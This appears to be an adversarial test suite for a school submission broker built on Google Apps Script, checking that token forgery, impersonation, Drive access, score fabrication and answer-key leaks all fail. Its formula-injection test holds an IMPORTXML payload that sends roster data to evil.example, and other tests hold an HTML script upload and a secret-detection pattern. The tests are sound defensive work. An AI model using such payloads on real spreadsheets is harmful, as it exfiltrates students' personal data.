/**
 * Adversarial tests for the submission broker. Each test is an attack that must
 * fail. They run the real built broker (dist/Code.gs + dist/GradingCore.gs)
 * against the labelled TEST DOUBLES in fakeAppsScript.ts. The doubles stand in
 * for Google's signature check (tokeninfo), Drive and Sheets; behaviour that
 * only real Google can show is listed in docs/14-security-audit.md as
 * "requires live verification".
 */
import { beforeAll, beforeEach, describe, expect, it } from 'vitest';
import { execFileSync } from 'node:child_process';
import { createHmac } from 'node:crypto';
import { createActivity, ReceiptFields, type Activity, type Item } from '@ilp/core';
import { brokerBuildScript, createBroker, fakeJwt } from './fakeAppsScript';

const CLIENT = 'test-client.apps.googleusercontent.com';
const TEACHER = 'teacher@example.com';
const BROKER = 'AKfycbSECURITYTEST_teacher_service_0001';
const ATTACKER_BROKER = 'AKfycbATTACKER_controlled_service_9999';

beforeAll(() => {
  execFileSync(process.execPath, [brokerBuildScript()], { stdio: 'ignore' });
});

const webm = () => Buffer.concat([Buffer.from([0x1a, 0x45, 0xdf, 0xa3]), Buffer.alloc(60, 1)]).toString('base64');

function activity(title = 'Fictional quiz'): Activity {
  const a = createActivity(title);
  a.items = [
    { type: 'multiple-choice', id: 'itm_q1', audioCue: null, prompt: 'Q1', mode: 'single', choices: [{ id: 'itm_q1a', text: 'A', correct: true }, { id: 'itm_q1b', text: 'B', correct: false }], shuffleChoices: false, points: 1, scoring: 'all-or-nothing', feedback: { explanation: 'secret explanation' }, skills: [] } as Item,
    { type: 'speaking', id: 'itm_sp', audioCue: null, targets: [{ id: 't1', text: 'Hello' }], submission: 'optional', skills: [] } as unknown as Item,
    { type: 'speaking', id: 'itm_sp_none', audioCue: null, targets: [{ id: 't1', text: 'Bye' }], submission: 'none', skills: [] } as unknown as Item,
  ];
  return a;
}

let b: ReturnType<typeof createBroker>;
let teacher: string;
let classId: string;
let asgId: string;

function setup() {
  b = createBroker({ teacher: TEACHER, clientId: CLIENT, brokerId: BROKER });
  teacher = b.signIn(TEACHER, 'sub-teacher');
  expect(b.connect(teacher).result.role).toBe('teacher'); // "Connect" in the app, with the code from setup()
  classId = b.call('classes.create', teacher, { name: 'Test 7A' }).result.classId;
  expect(b.call('roster.put', teacher, { classId, rows: [
    { studentNumber: 'S01', name: 'Fictional Ada', email: 'student1@example.com' },
    { studentNumber: 'S02', name: 'Fictional Ben', email: 'student2@example.com' },
    { studentNumber: '007', email: 'student7@example.com' },
  ] }).ok).toBe(true);
  asgId = b.call('assignments.create', teacher, { classId, activity: activity(), version: 1, contentHash: 'sha256:x' }).result.id;
}

const payload = (attemptId: string, extra: Record<string, unknown> = {}, assignmentId = asgId) => ({
  payload: { assignmentId, attemptId, attemptNumber: 1, startedAt: new Date().toISOString(), submittedAt: new Date().toISOString(), presentedItemIds: null, responses: { itm_q1: { choiceIds: ['itm_q1a'] } }, clientScore: null, ...extra },
});

describe('authentication: forged, foreign and replayed tokens', () => {
  beforeEach(setup);

  it('rejects a forged token that claims to be the teacher (bad signature)', () => {
    const forged = fakeJwt({ aud: CLIENT, iss: 'https://accounts.google.com', exp: Date.now() / 1000 + 3600, email: TEACHER, email_verified: true, sub: 'sub-teacher', nonce: `ilp-b.${BROKER}` });
    expect(b.call('roster.get', forged, { classId }).error).toBe('unauthenticated');
  });

  it('rejects tokens for another app, from another issuer, expired, or with an unverified email', () => {
    for (const extra of [{ aud: 'other-app.apps.googleusercontent.com' }, { iss: 'https://evil.example' }, { exp: Math.floor(Date.now() / 1000) - 10 }, { email_verified: 'false' }]) {
      expect(b.call('roster.get', b.signIn(TEACHER, 'sub-teacher', extra), { classId }).ok).toBe(false);
    }
  });

  it('a teacher token captured by a malicious service cannot be replayed to this service', () => {
    // The teacher opened a link pointing at an attacker's service; the app sent it a token minted for THAT service.
    const captured = b.signIn(TEACHER, 'sub-teacher', { nonce: `ilp-b.${ATTACKER_BROKER}` });
    const r = b.call('roster.get', captured, { classId });
    expect(r.ok).toBe(false);
    expect(JSON.stringify(r)).not.toContain('Fictional Ada');
  });

  it('a student token captured by a malicious service cannot submit or read here', () => {
    const captured = b.signIn('student1@example.com', 'sub-1', { nonce: `ilp-b.${ATTACKER_BROKER}` });
    expect(b.call('student.submit', captured, payload('att_replay')).ok).toBe(false);
    expect(b.call('student.assignment', captured, { assignmentId: asgId }).ok).toBe(false);
  });

  it('rejects tokens without a service nonce', () => {
    const plain = b.signIn('student1@example.com', 'sub-1', { nonce: undefined });
    expect(b.call('student.assignment', plain, { assignmentId: asgId }).ok).toBe(false);
  });

  it('before the teacher connects, nobody can use the service; a non-teacher cannot connect it', () => {
    const fresh = createBroker({ teacher: TEACHER, clientId: CLIENT, brokerId: BROKER });
    expect(fresh.call('whoami', fresh.signIn('student1@example.com', 'sub-1')).error).toBe('not-connected');
    expect(fresh.call('whoami', fresh.signIn(TEACHER, 'sub-teacher')).error).toBe('not-connected'); // no code, no connection
    expect(fresh.connect(fresh.signIn('student1@example.com', 'sub-1'), 'AAAA-BBBB-CCCC-DDDD').error).toBe('forbidden');
    expect(fresh.props.get('BROKER_ID')).toBeUndefined();
    expect(fresh.connect(fresh.signIn(TEACHER, 'sub-teacher')).result.role).toBe('teacher');
    expect(fresh.props.get('BROKER_ID')).toBe(BROKER);
  });

  it('pins the teacher to their Google account id: the same email with another account id is not the teacher', () => {
    const other = b.signIn(TEACHER, 'sub-somebody-else');
    expect(b.call('roster.get', other, { classId }).ok).toBe(false);
  });

  it('cached verification still enforces expiry and the service nonce', () => {
    const t = b.signIn('student1@example.com', 'sub-1');
    expect(b.call('student.assignment', t, { assignmentId: asgId }).ok).toBe(true);
    const fetches = b.tokenFetches();
    expect(b.call('student.assignment', t, { assignmentId: asgId }).ok).toBe(true);
    expect(b.tokenFetches()).toBe(fetches); // served from cache
  });

  it('junk and wrong-audience tokens are refused without spending the Google verification quota', () => {
    const before = b.tokenFetches();
    expect(b.call('whoami', 'not-a-jwt').error).toBe('unauthenticated');
    expect(b.call('whoami', fakeJwt({ aud: 'someone-else', exp: Date.now() / 1000 + 100 })).error).toBe('unauthenticated');
    expect(b.call('whoami', fakeJwt({ aud: CLIENT, exp: 1 })).error).toBe('unauthenticated');
    expect(b.tokenFetches()).toBe(before);
    // Only Google's token check and the Drive/Sheets APIs are ever called.
    expect(b.fetchedUrls.every((u) => /^https:\/\/(oauth2\.googleapis\.com\/tokeninfo\?id_token=|www\.googleapis\.com\/(upload\/)?drive\/v3\/|sheets\.googleapis\.com\/v4\/spreadsheets\/)/.test(u))).toBe(true);
  });

  it('an unauthenticated GET reveals only the service name and version', () => {
    const out = JSON.parse((b.ctx.doGet as () => { getContent(): string })().getContent());
    expect(Object.keys(out).sort()).toEqual(['ok', 'service', 'version']);
  });
});

describe('authorization: roster binding and data separation', () => {
  beforeEach(setup);

  it('a student cannot claim another student’s number: the number comes only from the verified account', () => {
    const s2 = b.signIn('student2@example.com', 'sub-2');
    const r = b.call('student.submit', s2, payload('att_claim', { studentNumber: 'S01', student: { studentNumber: 'S01' } }));
    expect(r.result.studentNumber).toBe('S02');
    expect(b.call('student.assignment', s2, { assignmentId: asgId, studentNumber: 'S01' }).result.studentNumber).toBe('S02');
  });

  it('a second Google account cannot take over a bound number, even after the first account signs in', () => {
    b.call('student.assignment', b.signIn('student1@example.com', 'sub-1'), { assignmentId: asgId });
    expect(b.call('student.assignment', b.signIn('student1@example.com', 'sub-impostor'), { assignmentId: asgId }).error).toBe('forbidden');
  });

  it('students cannot call any teacher action', () => {
    const s1 = b.signIn('student1@example.com', 'sub-1');
    for (const action of ['classes.list', 'classes.create', 'roster.get', 'roster.put', 'assignments.create', 'assignments.list', 'assignments.update', 'submissions.list', 'submissions.report']) {
      expect(b.call(action, s1, { classId, assignmentId: asgId, rows: [], name: 'x' }).error).toBe('forbidden');
    }
  });

  it('students see neither the roster nor other students’ submissions', () => {
    const s1 = b.signIn('student1@example.com', 'sub-1');
    const s2 = b.signIn('student2@example.com', 'sub-2');
    b.call('student.submit', s1, payload('att_s1'));
    const seen = JSON.stringify([b.call('student.assignment', s2, { assignmentId: asgId }), b.call('student.receipts', s2, { assignmentId: asgId }), b.call('whoami', s2)]);
    expect(seen).not.toMatch(/Fictional Ada|Fictional Ben|student1@|student7@|S01|att_s1|sub-1/);
    expect(b.call('student.receipts', s2, { assignmentId: asgId }).result).toEqual([]);
  });

  it('keeps student numbers exactly as typed (no "007" → 7 conversion by Sheets)', () => {
    const s7 = b.signIn('student7@example.com', 'sub-7');
    expect(b.call('student.assignment', s7, { assignmentId: asgId }).result.studentNumber).toBe('007');
    expect(b.call('student.submit', s7, payload('att_7')).result.studentNumber).toBe('007');
    expect(b.call('roster.get', teacher, { classId }).result.map((r: { studentNumber: string }) => r.studentNumber)).toContain('007');
  });
});

describe('Drive isolation', () => {
  beforeEach(setup);

  it('no request field can make the service read, change or delete an unrelated Drive file', () => {
    const privateFolder = b.emu.userCreate('Teacher private', { mimeType: 'application/vnd.google-apps.folder' });
    const id = b.emu.userCreate('tax.txt', { parents: [privateFolder], content: 'TOP-SECRET' });
    const s1 = b.signIn('student1@example.com', 'sub-1');
    const evil = { fileId: id, folderId: id, reportFileId: id, assetId: id, classId: id, assignmentId: id, attemptId: id };
    const outputs = [
      ...['submissions.report', 'roster.get', 'assignments.update', 'student.asset', 'student.assignment'].map((a) => b.call(a, teacher, evil)),
      ...['student.asset', 'student.assignment', 'student.receipts', 'student.submit'].map((a) => b.call(a, s1, { ...evil, payload: { ...payload('att_x').payload, assignmentId: id } })),
      b.call('student.asset', s1, { assignmentId: asgId, assetId: id }),
    ];
    expect(JSON.stringify(outputs)).not.toContain('TOP-SECRET');
    expect(b.emu.text(id)).toBe('TOP-SECRET');
    expect(b.emu.file(id)!.parents).toEqual([privateFolder]);
    expect(b.emu.file(id)!.trashed).toBe(false);
  });
});

describe('submissions: fabrication, replay, limits and receipts', () => {
  beforeEach(setup);

  it('fabricated scores and totals are ignored; the server re-grades and flags the mismatch', () => {
    const s1 = b.signIn('student1@example.com', 'sub-1');
    const r = b.call('student.submit', s1, payload('att_fab', { responses: { itm_q1: { choiceIds: ['itm_q1b'] } }, clientScore: 100, score: 100, totals: { score: 100 } })).result;
    expect(r.score).toBe(0);
    expect(b.call('submissions.list', teacher, { assignmentId: asgId }).result[0].scoreMismatch).toBe(true);
  });

  it('a replayed submission is recorded once and cannot overwrite the original', () => {
    const s1 = b.signIn('student1@example.com', 'sub-1');
    const first = b.call('student.submit', s1, payload('att_rep')).result;
    const replay = b.call('student.submit', s1, payload('att_rep', { responses: { itm_q1: { choiceIds: ['itm_q1b'] } } })).result;
    expect(replay).toMatchObject({ duplicate: true, receiptId: first.receiptId, score: first.score });
    // Another student re-using the same attempt id gets their own record and cannot touch the first.
    const other = b.call('student.submit', b.signIn('student2@example.com', 'sub-2'), payload('att_rep')).result;
    expect(other.studentNumber).toBe('S02');
    expect(b.call('submissions.list', teacher, { assignmentId: asgId }).result).toHaveLength(2);
  });

  it('enforces deadlines even though Sheets stores dates as dates', () => {
    const past = new Date(Date.now() - 60_000).toISOString();
    const strict = b.call('assignments.create', teacher, { classId, activity: activity(), version: 1, contentHash: 'x', dueAt: past, allowLate: false }).result.id;
    expect(b.call('student.submit', b.signIn('student1@example.com', 'sub-1'), payload('att_late', {}, strict)).error).toBe('past-due');
    const lenient = b.call('assignments.create', teacher, { classId, activity: activity(), version: 1, contentHash: 'x', dueAt: past }).result.id;
    expect(b.call('student.submit', b.signIn('student1@example.com', 'sub-1'), payload('att_late2', {}, lenient)).result.late).toBe(true);
  });

  it('rejects an invalid due date from the teacher client', () => {
    expect(b.call('assignments.update', teacher, { assignmentId: asgId, dueAt: 'whenever' }).error).toBe('bad-request');
  });

  it('receipts are HMAC-signed with a secret that never leaves the service', () => {
    const s1 = b.signIn('student1@example.com', 'sub-1');
    const r = b.call('student.submit', s1, payload('att_sig')).result;
    const secret = b.props.get('HMAC_SECRET')!;
    expect(secret.length).toBeGreaterThanOrEqual(64);
    const sign = (o: Record<string, unknown>) => createHmac('sha256', secret).update(ReceiptFields.map((k) => `${k}=${o[k] ?? ''}`).join('&')).digest('hex');
    expect(r.signature).toBe(sign(r));
    expect(sign({ ...r, score: 99 })).not.toBe(r.signature);
    const everything = JSON.stringify([r, b.call('submissions.list', teacher, { assignmentId: asgId }), b.call('whoami', teacher), b.call('student.assignment', s1, { assignmentId: asgId })]);
    expect(everything).not.toContain(secret);
  });

  it('a busy service reports “busy” (retried later) instead of a permanent failure', () => {
    b.lock.busy = true;
    expect(b.call('student.submit', b.signIn('student1@example.com', 'sub-1'), payload('att_busy')).error).toBe('busy');
  });

  it('unexpected errors do not reveal internal details', () => {
    const s1 = b.signIn('student1@example.com', 'sub-1');
    b.call('student.submit', s1, payload('att_e'));
    const row = b.call('submissions.list', teacher, { assignmentId: asgId }).result[0];
    delete b.emu.state.files[row.reportFileId]; // the teacher deleted it in Drive
    const r = b.call('submissions.report', teacher, { assignmentId: asgId, attemptId: 'att_e' });
    expect(r.ok).toBe(false);
    expect(r.message).not.toMatch(/file_|No file|Error|at /);
  });

  it('rejects oversized responses', () => {
    const big = 'x'.repeat(3_000_000);
    expect(b.call('student.submit', b.signIn('student1@example.com', 'sub-1'), payload('att_big', { responses: { itm_q1: { text: big } } })).error).toBe('bad-request');
  });
});

describe('recordings', () => {
  beforeEach(setup);
  const rec = (extra: Record<string, unknown>) => ({ id: 'rec_1', itemId: 'itm_sp', targetId: 't1', mime: 'audio/webm', base64: webm(), ...extra });
  const recordingsIn = () => b.files().filter((f) => f.path.includes('/Recordings/') && f.mimeType !== 'application/vnd.google-apps.folder');

  it('accepts a real audio recording for a speaking item that allows submission', () => {
    expect(b.call('student.submit', b.signIn('student1@example.com', 'sub-1'), payload('att_r', { recordings: [rec({})] })).ok).toBe(true);
    expect(recordingsIn()).toHaveLength(1);
    expect(recordingsIn()[0]!.mimeType).toBe('audio/webm');
  });

  it('refuses uploads that are not audio, are for the wrong item or target, or are duplicates', () => {
    const s1 = b.signIn('student1@example.com', 'sub-1');
    const bad = [
      rec({ mime: 'text/html', base64: Buffer.from('<script>alert(1)</script>').toString('base64') }),
      rec({ base64: Buffer.from('<html>not audio at all, just text</html>').toString('base64') }),
      rec({ itemId: 'itm_q1' }),
      rec({ itemId: 'itm_sp_none' }),
      rec({ targetId: 'nope' }),
      rec({ itemId: 'itm_not_in_activity' }),
    ];
    bad.forEach((r, i) => expect(b.call('student.submit', s1, payload(`att_bad${i}`, { recordings: [r] })).error, JSON.stringify(r).slice(0, 80)).toBe('bad-request'));
    expect(b.call('student.submit', s1, payload('att_dup', { recordings: [rec({}), rec({ id: 'rec_2' })] })).error).toBe('bad-request');
    expect(recordingsIn()).toHaveLength(0);
  });
});

describe('spreadsheet formula injection', () => {
  beforeEach(setup);

  it('text from activities, class names and rosters is never stored as a formula', () => {
    const payloadF = '=IMPORTXML("https://evil.example/?d="&Roster!C2,"//a")';
    b.call('classes.create', teacher, { name: payloadF, section: '+HYPERLINK("https://evil.example")' });
    b.call('assignments.create', teacher, { classId, activity: activity(payloadF), version: 1, contentHash: 'x', title: '@SUM(1)' });
    b.call('roster.put', teacher, { classId, rows: [{ studentNumber: 'S09', name: '=IMAGE("https://evil.example/x.png")', email: 'student9@example.com' }] });
    expect(b.emu.formulas).toEqual([]);
    expect(b.call('classes.list', teacher).result.map((c: { name: string }) => c.name)).toContain(payloadF);
    expect(b.call('roster.get', teacher, { classId }).result[0].name).toBe('=IMAGE("https://evil.example/x.png")');
  });
});

describe('hidden answer keys', () => {
  beforeEach(setup);

  it('the student copy contains no answer keys, explanations or correct/incorrect feedback', () => {
    const a = activity();
    a.items = a.items.map((i) => ({ ...i, feedback: { correct: 'Right: A', incorrect: 'It was A', explanation: 'secret explanation', hint: 'Think!' } }) as Item);
    const id = b.call('assignments.create', teacher, { classId, activity: a, version: 1, contentHash: 'x', grading: 'hidden' }).result.id;
    const seen = JSON.stringify(b.call('student.assignment', b.signIn('student1@example.com', 'sub-1'), { assignmentId: id }).result.activity);
    expect(seen).not.toMatch(/secret explanation|Right: A|It was A|"correct":true/);
    expect(seen).toContain('Think!');
  });
});

describe('code integrity', () => {
  it('Code.gs and GradingCore.gs come from the same build, and the app expects this service version', async () => {
    setup();
    expect(b.call('whoami', teacher).result).toMatchObject({ coreOk: true, version: (await import('../../../apps/web/src/config')).BROKER_VERSION });
  });
  it('a GradingCore from another build is detected', () => {
    setup();
    b.ctx.ILP_CORE_BUILD = 'something-else';
    expect(b.call('whoami', teacher).result.coreOk).toBe(false);
  });
  it('the generated files carry the real client id and no placeholders or secrets', async () => {
    const { readFileSync } = await import('node:fs');
    const { brokerDist } = await import('./fakeAppsScript');
    const { resolve } = await import('node:path');
    execFileSync(process.execPath, [brokerBuildScript()], { stdio: 'ignore', env: { ...process.env, ILP_GOOGLE_CLIENT_ID: '964954121204-g9k3t57l2rvcgpgr32pv8g35sd4o4apu.apps.googleusercontent.com' } });
    const code = readFileSync(resolve(brokerDist(), 'Code.gs'), 'utf8');
    expect(code).toContain('var CLIENT_ID = "964954121204-g9k3t57l2rvcgpgr32pv8g35sd4o4apu.apps.googleusercontent.com"');
    expect(code).not.toMatch(/__CLIENT_ID__|__CORE_BUILD__|AIza[0-9A-Za-z_-]{20,}|client_secret|GOCSPX/);
    const manifest = JSON.parse(readFileSync(resolve(brokerDist(), 'appsscript.json'), 'utf8'));
    expect(manifest.webapp).toEqual({ executeAs: 'USER_DEPLOYING', access: 'ANYONE_ANONYMOUS' });
    // 0.6.0: per-file Drive access only (was: drive, spreadsheets, script.external_request, userinfo.email).
    expect(manifest.oauthScopes.sort()).toEqual(['https://www.googleapis.com/auth/drive.file', 'https://www.googleapis.com/auth/script.external_request']);
    execFileSync(process.execPath, [brokerBuildScript()], { stdio: 'ignore' });
  });
});
